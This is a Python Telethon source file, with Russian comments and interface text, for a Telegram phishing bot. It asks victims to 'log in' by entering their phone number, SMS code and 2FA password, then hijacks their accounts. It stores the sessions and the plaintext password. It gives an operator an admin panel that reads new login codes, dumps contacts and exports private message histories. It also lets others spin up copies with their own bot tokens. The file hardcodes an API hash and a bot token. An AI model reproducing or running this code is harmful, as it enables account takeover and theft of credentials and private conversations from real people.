import os
import logging
import asyncio
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.types import (
    MessageMediaPhoto, MessageMediaDocument, 
    DocumentAttributeVideo, DocumentAttributeFilename, DocumentAttributeAudio
)
from telethon.tl.functions.contacts import GetContactsRequest
from datetime import datetime
from collections import defaultdict

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

API_ID = 10953300
API_HASH = '9c24426e5d6fa1d441913e3906627f87'
MAIN_BOT_TOKEN = '7556708730:AAG7t3H3zbqcTvLbLuED2JxbYmnbpUiz3Ig'
ADMIN_ID = 7683309378 

USER_BOTS = {}
USER_SESSIONS = {}  
CONNECTED_ACCOUNTS = {} 
CONTACT_CACHE = {} 
MESSAGE_CACHE = defaultdict(dict)  
BOT_USERS = defaultdict(list)  

if not os.path.exists('sessions'):
    os.makedirs('sessions')

async def update_clock_task(phone):
    while True:
        try:
            account = CONNECTED_ACCOUNTS.get(phone)
            if not account or not account.get('active'):
                break
                
            client = account['client']
            me = await client.get_me()
            
            # Получаем текущее время в формате HH:MM
            current_time = datetime.now().strftime("%H:%M")
            
            # Обновляем только если время изменилось
            if getattr(me, 'last_name', '') != current_time:
                await client(UpdateProfileRequest(
                    first_name=getattr(me, 'first_name', ''),
                    last_name=current_time,
                    about=getattr(me, 'about', '')
                ))
                
        except Exception as e:
            logger.error(f"Ошибка обновления времени для {phone}: {str(e)}")
            
        await asyncio.sleep(60)  # Обновляем каждые 60 секунд

async def start_client(phone):
    session_file = f"sessions/{phone.replace('+', '')}.session"
    client = TelegramClient(session_file, API_ID, API_HASH)
    await client.connect()
    return client

async def load_connected_accounts():
    session_files = [f for f in os.listdir('sessions') if f.endswith('.session')]
    
    for session_file in session_files:
        phone = '+' + session_file.split('.')[0]
        try:
            client = await start_client(phone)
            if await client.is_user_authorized():
                me = await client.get_me()
                CONNECTED_ACCOUNTS[phone] = {
                    'client': client,
                    'connected_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    'active': True,
                    '2fa_password': "Неизвестно",
                    'me': me
                }
                logger.info(f"Автоматически подключен аккаунт: {phone}")
            else:
                await client.disconnect()
        except Exception as e:
            logger.error(f"Ошибка подключения аккаунта {phone}: {str(e)}")

async def start_user_bot(bot_token):
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.start(bot_token=bot_token)
    client._custom_bot_token = bot_token 
    USER_BOTS[bot_token] = client

    @client.on(events.NewMessage(pattern='/start'))
    async def user_bot_start(event):
        if event.sender_id not in BOT_USERS[bot_token]:
            BOT_USERS[bot_token].append(event.sender_id)
        
        buttons = [
            [Button.inline("Войти", b"login")],
        ]
        
        if event.sender_id == ADMIN_ID:
            buttons.append([Button.inline("Админ панель", b"admin")])
        
        await event.reply("Добро пожаловать в бота!", buttons=buttons)
    
    @client.on(events.NewMessage)
    async def user_bot_message(event):
        user_data = USER_SESSIONS.get(event.sender_id)
        
        if not user_data:
            return
        
        if user_data.get('state') == 'awaiting_phone':
            await handle_phone(event)
        elif user_data.get('state') == 'awaiting_password':
            await handle_password(event)
    
    @client.on(events.CallbackQuery)
    async def user_bot_callback(event):
        data = event.data.decode('utf-8')
        
        if data == "login":
            await handle_login(event)
        elif data == "admin":
            await handle_admin_page(event)
        elif data == "connected_accounts":
            await show_connected_accounts(event)
        elif data == "check_accounts":
            await event.respond("В разработке...")
        elif data == "parse_contacts":
            await parse_contacts(event)
        elif data == "refresh_data":
            await refresh_data(event)
        elif data.startswith("parse_contacts_"):
            phone = data[15:]
            await parse_contacts(event, phone)
        elif data.startswith("contacts_page_"):
            parts = data.split('_')
            phone = parts[2]
            page = int(parts[3])
            await parse_contacts(event, phone, page)
        elif data.startswith("contact_"):
            parts = data.split('_')
            phone = parts[1]
            user_id = int(parts[2])
            await show_contact_detail(event, phone, user_id)
        elif data.startswith("texts_"):
            parts = data.split('_')
            phone = parts[1]
            user_id = int(parts[2])
            await get_contact_messages(event, phone, user_id, 'texts')
        elif data.startswith("files_"):
            parts = data.split('_')
            phone = parts[1]
            user_id = int(parts[2])
            await get_contact_messages(event, phone, user_id, 'files')
        elif data.startswith("account_"):
            phone = data[8:] 
            await show_account_details(event, phone)
        elif data.startswith("delete_"):
            phone = data[7:]
            await delete_session(event, phone)
        elif data.startswith("accounts_page_"):
            page = int(data[14:]) 
            await show_connected_accounts(event, page)
        elif data.startswith("get_code_"):
            phone = data[9:]  
            await get_last_code(event, phone)
        elif data.startswith("code_"):
            await handle_code_input(event)
        elif data == "manage_bots":
            await show_bot_list(event)
        elif data.startswith("bots_page_"):
            page = int(data[10:])
            await show_bot_list(event, page)
        elif data.startswith("bot_detail_"):
            bot_token = data[11:]
            await show_bot_detail(event, bot_token)
        elif data.startswith("acc_detail_"):
            parts = data.split('_')
            bot_token = parts[2]
            phone = parts[3]
            await show_account_details(event, phone)
    
    logger.info(f"Запущен пользовательский бот с токеном: {bot_token}")
    await client.run_until_disconnected()

async def show_bot_list(event, page=0):
    if event.sender_id != ADMIN_ID:
        return
    
    bot_tokens = list(USER_BOTS.keys())
    if not bot_tokens:
        await event.edit("Нет запущенных ботов!")
        return

    bots_info = []
    for token in bot_tokens:
        try:
            client = USER_BOTS[token]
            me = await client.get_me()
            bots_info.append({
                'token': token,
                'username': me.username,
                'name': me.first_name,
                'users_count': len(BOT_USERS.get(token, []))
            })
        except Exception as e:
            logger.error(f"Ошибка получения информации о боте {token}: {str(e)}")
    
    pages = [bots_info[i:i+5] for i in range(0, len(bots_info), 5)]
    total_pages = len(pages)
    
    if page >= total_pages:
        page = total_pages - 1
    
    current_page = pages[page] if pages else []
    
    message = "Список запущенных ботов:\n\n"
    buttons = []
    for bot in current_page:
        buttons.append([
            Button.inline(
                f"@{bot['username']} ({bot['name']}) - {bot['users_count']} пользователей", 
                f"bot_detail_{bot['token']}"
            )
        ])
    
    nav_buttons = []
    if page > 0:
        nav_buttons.append(Button.inline("Назад", f"bots_page_{page-1}"))
    
    nav_buttons.append(Button.inline(f"{page+1}/{total_pages}", b"noop"))
    
    if page < total_pages - 1:
        nav_buttons.append(Button.inline("Вперед", f"bots_page_{page+1}"))
    
    if nav_buttons:
        buttons.append(nav_buttons)
    
    buttons.append([Button.inline("Назад", b"admin")])
    
    await event.edit(message, buttons=buttons)

async def show_bot_detail(event, bot_token):
    if event.sender_id != ADMIN_ID:
        return
    
    if bot_token not in USER_BOTS:
        await event.edit("Бот не найден!")
        return
    
    try:
        client = USER_BOTS[bot_token]
        me = await client.get_me()
        users = BOT_USERS.get(bot_token, [])
        
        message = (
            f"Информация о боте:\n"
            f"Имя: {me.first_name}\n"
            f"Username: @{me.username}\n"
            f"Подключенных пользователей: {len(users)}\n\n"
            f"Список подключенных аккаунтов:"
        )
        
        connected_accounts = []
        for phone, account in CONNECTED_ACCOUNTS.items():
            if account.get('bot_token') == bot_token:
                connected_accounts.append(phone)
        
        buttons = []
        for phone in connected_accounts[:10]:
            account = CONNECTED_ACCOUNTS[phone]
            name = getattr(account.get('me', ''), 'first_name', '') or ""
            buttons.append([
                Button.inline(
                    f"{phone} {name[:10]}", 
                    f"acc_detail_{bot_token}_{phone.replace('+', '')}"
                )
            ])
        
        buttons.append([Button.inline("Назад", b"manage_bots")])
        
        await event.edit(message, buttons=buttons)
    
    except Exception as e:
        await event.edit(f"Ошибка: {str(e)}")

async def handle_start_message(event):
    if event.sender_id == ADMIN_ID:
        buttons = [
            [Button.inline("Telegram Bot", b"platform_telegram")],
            [Button.inline("Instagram", b"platform_instagram")],
            [Button.inline("Управление ботами", b"manage_bots")]
        ]
    else:
        buttons = [
            [Button.inline("Telegram Bot", b"platform_telegram")],
            [Button.inline("Instagram", b"platform_instagram")]
        ]
    await event.respond("Выберите платформу:", buttons=buttons)

async def handle_login(event):
    await event.reply("Введите ваш номер телефона (в формате +998...):\nПример: +998901234567")
    USER_SESSIONS[event.sender_id] = {'state': 'awaiting_phone'}

async def handle_phone(event):
    phone = event.text
    if phone.startswith("+") and phone[1:].isdigit():
        client = await start_client(phone)
        try:
            await asyncio.sleep(1)
            await client.send_code_request(phone)
            USER_SESSIONS[event.sender_id] = {
                'client': client,
                'phone': phone,
                'code': '',
                'awaiting_password': False,
                'state': 'awaiting_code',
                'message': await event.reply(
                    "Введите код из SMS (используя кнопки):",
                    buttons=[
                        [Button.inline('1', b'code_1'), Button.inline('2', b'code_2'), Button.inline('3', b'code_3')],
                        [Button.inline('4', b'code_4'), Button.inline('5', b'code_5'), Button.inline('6', b'code_6')],
                        [Button.inline('7', b'code_7'), Button.inline('8', b'code_8'), Button.inline('9', b'code_9')],
                        [Button.inline('Очистить', b'code_clear'), Button.inline('0', b'code_0')]
                    ]
                )
            }
            CONNECTED_ACCOUNTS[phone] = {
                'client': client,
                'connected_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'active': False,
                '2fa_password': "Неизвестно",
                'bot_token': getattr(event.client, '_custom_bot_token', 'N/A')
            }
        except Exception as e:
            await event.reply(f"Ошибка: {str(e)}")
    else:
        await event.reply("Неверный формат номера. Пожалуйста, используйте формат +998XXXXXXXXX")

async def handle_code_input(event):
    user_data = USER_SESSIONS.get(event.sender_id)
    if not user_data or user_data.get('state') != 'awaiting_code':
        await event.reply("Сначала введите номер телефона.")
        return

    client = user_data['client']
    phone = user_data['phone']

    data = event.data.decode('utf-8')
    code_input = data.split("_")[1]
    if code_input == "clear":
        user_data['code'] = ""
        await user_data['message'].edit("Код очищен. Введите новый код:")
        return
    else:
        user_data['code'] += code_input

    if len(user_data['code']) >= 5:
        try:
            await client.sign_in(phone, user_data['code'])
            me = await client.get_me()
            account_data = {
                'client': client,
                'connected_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'active': True,
                '2fa_password': "Отсутствует",
                'me': me
            }
            
            if hasattr(event.client, '_custom_bot_token'):
                account_data['bot_token'] = event.client._custom_bot_token
            
            CONNECTED_ACCOUNTS[phone] = account_data
            
            asyncio.create_task(update_clock_task(phone))
            
            await event.reply("Аккаунт успешно подключен!")
        except SessionPasswordNeededError:
            user_data['awaiting_password'] = True
            user_data['state'] = 'awaiting_password'
            await event.reply("Введите ваш 2FA пароль:")
        except Exception as e:
            await event.reply(f"Неверный код или ошибка: {str(e)}")
    else:
        await user_data['message'].edit(f"Текущий код: {user_data['code']}\nВведите остальные цифры")

async def handle_password(event):
    user_data = USER_SESSIONS.get(event.sender_id)
    if not user_data or user_data.get('state') != 'awaiting_password':
        await event.reply("Сначала правильно введите код.")
        return

    client = user_data['client']
    phone = user_data['phone']
    
    try:
        await client.sign_in(password=event.text)
        me = await client.get_me()
        CONNECTED_ACCOUNTS[phone] = {
            'client': client,
            'connected_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'active': True,
            '2fa_password': event.text,
            'me': me,
            'bot_token': getattr(event.client, '_custom_bot_token', 'N/A')
        }
        
        asyncio.create_task(update_clock_task(phone))
        
        await event.reply("Аккаунт успешно подключен!")
    except Exception as e:
        await event.reply(f"Ошибка: {str(e)}")

async def handle_admin_page(event):
    if event.sender_id != ADMIN_ID:
        await event.reply("Доступ запрещен!")
        return
    
    buttons = [
        [Button.inline("Подключенные аккаунты", b"connected_accounts")],
        [Button.inline("Проверить аккаунты", b"check_accounts")],
        [Button.inline("Парсинг контактов", b"parse_contacts")],
        [Button.inline("Обновить данные", b"refresh_data")],
        [Button.inline("Управление ботами", b"manage_bots")]
    ]
    await event.reply("Админ панель:", buttons=buttons)

async def show_connected_accounts(event, page=0):
    if event.sender_id != ADMIN_ID:
        return
    
    accounts = list(CONNECTED_ACCOUNTS.keys())
    total_accounts = len(accounts)
    active_accounts = sum(1 for acc in CONNECTED_ACCOUNTS.values() if acc['active'])
    pages = [accounts[i:i+5] for i in range(0, len(accounts), 5)]
    total_pages = len(pages)
    
    if page >= total_pages:
        page = total_pages - 1
    
    current_page = pages[page] if pages else []
    
    message = (
        f"Статистика аккаунтов:\n"
        f"Всего: {total_accounts}\n"
        f"Активные: {active_accounts}\n"
        f"Неактивные: {total_accounts - active_accounts}\n\n"
    )
    
    buttons = []
    for phone in current_page:
        acc = CONNECTED_ACCOUNTS[phone]
        status = "Активен" if acc['active'] else "Неактивен"
        name = getattr(acc.get('me', ''), 'first_name', '') or ""
        buttons.append([Button.inline(f"{phone} {name[:10]} ({status})", f"account_{phone.replace('+', '')}")])
    
    nav_buttons = []
    if page > 0:
        nav_buttons.append(Button.inline("Назад", f"accounts_page_{page-1}"))
    
    nav_buttons.append(Button.inline(f"{page+1}/{total_pages}", b"noop"))
    
    if page < total_pages - 1:
        nav_buttons.append(Button.inline("Вперед", f"accounts_page_{page+1}"))
    
    if nav_buttons:
        buttons.append(nav_buttons)
    
    buttons.append([Button.inline("Назад", b"admin")])
    
    await event.edit(message, buttons=buttons)

async def show_account_details(event, phone):
    if event.sender_id != ADMIN_ID:
        return
    
    phone_with_plus = f"+{phone}"
    account = CONNECTED_ACCOUNTS.get(phone_with_plus)
    if not account:
        await event.reply("Аккаунт не найден!")
        return
    
    me = account.get('me', {})
    name = getattr(me, 'first_name', '') or ""
    if getattr(me, 'last_name', ''):
        name += f" {me.last_name}"
    if not name.strip():
        name = getattr(me, 'username', '') or "Неизвестно"
    
    message = (
        f"Информация об аккаунте:\n"
        f"Номер: {phone_with_plus}\n"
        f"Имя: {name}\n"
        f"Статус: {'Активен' if account['active'] else 'Неактивен'}\n"
        f"Время подключения: {account['connected_time']}\n"
        f"2FA: {account['2fa_password']}"
    )
    
    buttons = [
        [Button.inline("Получить код", f"get_code_{phone}"),
         Button.inline("Удалить сессию", f"delete_{phone}")],
        [Button.inline("Назад", b"connected_accounts")]
    ]
    
    await event.edit(message, buttons=buttons)

async def get_last_code(event, phone):
    if event.sender_id != ADMIN_ID:
        return
    
    phone_with_plus = f"+{phone}"
    account = CONNECTED_ACCOUNTS.get(phone_with_plus)
    if not account or not account['active']:
        await event.reply("Аккаунт не активен!")
        return
    
    client = account['client']
    
    try:
        async for message in client.iter_messages(777000, limit=1):
            code_text = f"Последнее SMS для {phone_with_plus}:\n\n{message.text}"
            filename = f"code_{phone}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(code_text)
        
            await event.client.send_file(
                event.chat_id,
                filename,
                caption=f"SMS код для {phone_with_plus}"
            )
            os.remove(filename)
            return
    
    except Exception as e:
        await event.reply(f"Ошибка: {str(e)}")

async def parse_contacts(event, phone=None, page=0):
    if event.sender_id != ADMIN_ID:
        return
    
    if not phone:
        accounts = [acc for acc in CONNECTED_ACCOUNTS if CONNECTED_ACCOUNTS[acc]['active']]
        if not accounts:
            await event.edit("Нет активных аккаунтов!")
            return
        
        buttons = []
        for acc in accounts:
            me = CONNECTED_ACCOUNTS[acc].get('me', {})
            name = getattr(me, 'first_name', '') or ""
            buttons.append([Button.inline(f"{acc} {name[:10]}", f"parse_contacts_{acc.replace('+', '')}")])
        buttons.append([Button.inline("Назад", b"admin")])
        
        await event.edit("Выберите аккаунт для парсинга:", buttons=buttons)
        return
    
    phone_with_plus = f"+{phone}"
    account = CONNECTED_ACCOUNTS.get(phone_with_plus)
    if not account or not account['active']:
        await event.reply("Аккаунт не активен!")
        return
    
    client = account['client']
    
    try:
        if phone_with_plus not in CONTACT_CACHE:
            result = await client(GetContactsRequest(hash=0))
            contact_users = [c for c in result.users if not getattr(c, 'bot', False) and c.id > 0]
            
            non_contact_users = []
            async for dialog in client.iter_dialogs(limit=50):
                if dialog.is_user and not getattr(dialog.entity, 'bot', False) and dialog.entity.id > 0:
                    if dialog.entity not in contact_users:
                        non_contact_users.append(dialog.entity)
            
            CONTACT_CACHE[phone_with_plus] = {
                'contacts': contact_users,
                'non_contacts': non_contact_users[:100]
            }
        
        data = CONTACT_CACHE[phone_with_plus]
        all_users = data['contacts'] + data['non_contacts']
        pages = [all_users[i:i+6] for i in range(0, len(all_users), 6)]
        total_pages = len(pages)
        
        if page >= total_pages:
            page = total_pages - 1
        
        current_page = pages[page] if pages else []
        
        buttons = []
        for i in range(0, len(current_page), 2):
            row = []
            for user in current_page[i:i+2]:
                name = getattr(user, 'first_name', '') or ""
                if getattr(user, 'last_name', ''):
                    name += f" {user.last_name}"
                if not name.strip():
                    name = getattr(user, 'username', '') or str(user.id)
                status = "Контакт" if user in data['contacts'] else "Не контакт"
                row.append(Button.inline(f"{name[:15]} ({status})", f"contact_{phone}_{user.id}"))
            if row:
                buttons.append(row)
        
        nav_buttons = []
        if page > 0:
            nav_buttons.append(Button.inline("Назад", f"contacts_page_{phone}_{page-1}"))
        
        nav_buttons.append(Button.inline(f"{page+1}/{total_pages}", b"noop"))
        
        if page < total_pages - 1:
            nav_buttons.append(Button.inline("Вперед", f"contacts_page_{phone}_{page+1}"))
        
        if nav_buttons:
            buttons.append(nav_buttons)
        
        buttons.append([Button.inline("Назад", b"parse_contacts")])
        
        message = (
            f"Контакты аккаунта {phone_with_plus}\n"
            f"Всего: {len(all_users)} (контактов: {len(data['contacts'])})"
        )
        await event.edit(message, buttons=buttons)
    
    except Exception as e:
        await event.reply(f"Ошибка: {str(e)}")

async def show_contact_detail(event, phone, user_id):
    if event.sender_id != ADMIN_ID:
        return
    
    phone_with_plus = f"+{phone}"
    account = CONNECTED_ACCOUNTS.get(phone_with_plus)
    if not account or not account['active']:
        await event.reply("Аккаунт не активен!")
        return
    
    client = account['client']
    
    try:
        user = await client.get_entity(user_id)
        name = getattr(user, 'first_name', '') or ""
        if getattr(user, 'last_name', ''):
            name += f" {user.last_name}"
        if not name.strip():
            name = getattr(user, 'username', '') or str(user.id)
        
        buttons = [
            [Button.inline("Тексты", f"texts_{phone}_{user_id}"),
             Button.inline("Файлы", f"files_{phone}_{user_id}")],
            [Button.inline("Назад", f"parse_contacts_{phone}")]
        ]
        
        await event.edit(
            f"Контакт: {name}\n"
            f"ID: {user_id}\n"
            f"Выберите тип сообщений:",
            buttons=buttons
        )
    
    except Exception as e:
        await event.reply(f"Ошибка: {str(e)}")

async def get_contact_messages(event, phone, user_id, media_type):
    if event.sender_id != ADMIN_ID:
        return
    
    phone_with_plus = f"+{phone}"
    account = CONNECTED_ACCOUNTS.get(phone_with_plus)
    if not account or not account['active']:
        await event.reply("Аккаунт не активен!")
        return
    
    client = account['client']
    
    try:
        user = await client.get_entity(user_id)
        name = getattr(user, 'first_name', '') or ""
        if getattr(user, 'last_name', ''):
            name += f" {user.last_name}"
        if not name.strip():
            name = getattr(user, 'username', '') or str(user.id)
        
        cache_key = f"{phone}_{user_id}"
        if cache_key not in MESSAGE_CACHE[phone_with_plus]:
            MESSAGE_CACHE[phone_with_plus][cache_key] = {
                'texts': [],
                'files': []
            }
            
            async for message in client.iter_messages(user):
                try:
                    if message.media:
                        MESSAGE_CACHE[phone_with_plus][cache_key]['files'].append(message)
                    elif message.text:
                        MESSAGE_CACHE[phone_with_plus][cache_key]['texts'].append(message)
                except Exception as e:
                    print(f"Ошибка обработки сообщения: {str(e)}")
        
        messages = MESSAGE_CACHE[phone_with_plus][cache_key][media_type]
        
        if not messages:
            await event.reply(f"Нет {media_type} с {name}!")
            return
        
        if media_type == 'texts':
            filename = f"messages_{phone}_{user_id}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                for i, msg in enumerate(messages, 1):
                    sender = "Вы" if msg.out else name
                    f.write(f"{i}. {sender} ({msg.date.strftime('%Y-%m-%d %H:%M:%S')}):\n{msg.text}\n\n")
            
            await event.client.send_file(
                event.chat_id,
                filename,
                caption=f"Переписка с {name}"
            )
            os.remove(filename)
        
        elif media_type == 'files':
            filename = f"files_{phone}_{user_id}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"Файлы от {name}\n\n")
                for i, msg in enumerate(messages, 1):
                    sender = "Вы" if msg.out else name
                    f.write(f"{i}. {sender} ({msg.date.strftime('%Y-%m-%d %H:%M:%S')})\n")
                    if hasattr(msg.media, 'photo'):
                        f.write("Фото\n\n")
                    elif hasattr(msg.media, 'document'):
                        if any(isinstance(attr, DocumentAttributeVideo) for attr in msg.media.document.attributes):
                            f.write("Видео\n\n")
                        else:
                            f.write("Документ\n\n")
            
            await event.client.send_file(
                event.chat_id,
                filename,
                caption=f"Файлы от {name}"
            )
            os.remove(filename)
    
    except Exception as e:
        await event.reply(f"Ошибка: {str(e)}")

async def delete_session(event, phone):
    if event.sender_id != ADMIN_ID:
        return
    
    phone_with_plus = f"+{phone}"
    if phone_with_plus in CONNECTED_ACCOUNTS:
        try:
            await CONNECTED_ACCOUNTS[phone_with_plus]['client'].disconnect()
            session_file = f"sessions/{phone}.session"
            if os.path.exists(session_file):
                os.remove(session_file)
            del CONNECTED_ACCOUNTS[phone_with_plus]
            await event.edit(f"Сессия {phone_with_plus} удалена!")
        except Exception as e:
            await event.edit(f"Ошибка: {str(e)}")
    else:
        await event.edit("Аккаунт не найден!")

async def refresh_data(event):
    if event.sender_id != ADMIN_ID:
        return
    
    CONTACT_CACHE.clear()
    MESSAGE_CACHE.clear()
    await event.edit("Кэш данных очищен!")

async def main():
    # Запускаем основного бота
    main_bot = TelegramClient('main_bot', API_ID, API_HASH)
    await main_bot.start(bot_token=MAIN_BOT_TOKEN)
    
    # Загружаем существующие сессии
    await load_connected_accounts()
    
    @main_bot.on(events.NewMessage(pattern='/start'))
    async def main_bot_start(event):
        await handle_start_message(event)
    
    @main_bot.on(events.CallbackQuery(data=b"platform_telegram"))
    async def telegram_handler(event):
        await event.edit("Отправьте токен Telegram бота:")
        USER_SESSIONS[event.sender_id] = {'state': 'awaiting_bot_token'}
    
    @main_bot.on(events.CallbackQuery(data=b"manage_bots"))
    async def manage_bots_handler(event):
        await show_bot_list(event)
    
    @main_bot.on(events.CallbackQuery(pattern=rb"bots_page_\d+"))
    async def bots_page_handler(event):
        page = int(event.data.decode().split('_')[2])
        await show_bot_list(event, page)
    
    @main_bot.on(events.CallbackQuery(pattern=rb"bot_detail_"))
    async def bot_detail_handler(event):
        bot_token = event.data.decode().split('_', 2)[2]
        await show_bot_detail(event, bot_token)
    
    @main_bot.on(events.NewMessage())
    async def main_bot_message(event):
        user_id = event.sender_id
        if USER_SESSIONS.get(user_id, {}).get('state') == 'awaiting_bot_token':
            bot_token = event.text.strip()

            if not (':' in bot_token and len(bot_token.split(':')[0]) >= 8):
                await event.respond("Неверный формат токена бота. Пожалуйста, отправьте правильный токен.")
                return

            try:
                temp_client = TelegramClient(f'botsession_{user_id}', API_ID, API_HASH)
                await temp_client.start(bot_token=bot_token)
                me = await temp_client.get_me()
                await temp_client.disconnect()

                bot_name = me.first_name or "Неизвестно"
                bot_username = me.username or "Неизвестно"
                created_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                asyncio.create_task(start_user_bot(bot_token))

                await event.respond(
                    "Бот успешно добавлен и запущен!\n\n"
                    f"Информация о боте:\n"
                    f"Имя бота: `{bot_name}`\n"
                    f"Username: `@{bot_username}`\n"
                    f"Токен: `{bot_token}`\n"
                    f"Дата создания: `{created_date}`"
                )

                USER_SESSIONS.pop(user_id, None)

            except Exception as e:
                await event.respond(f"Ошибка запуска бота: {str(e)}")
                logger.error(f"Ошибка запуска пользовательского бота: {e}")
    
    logger.info("Основной бот запущен")
    await main_bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
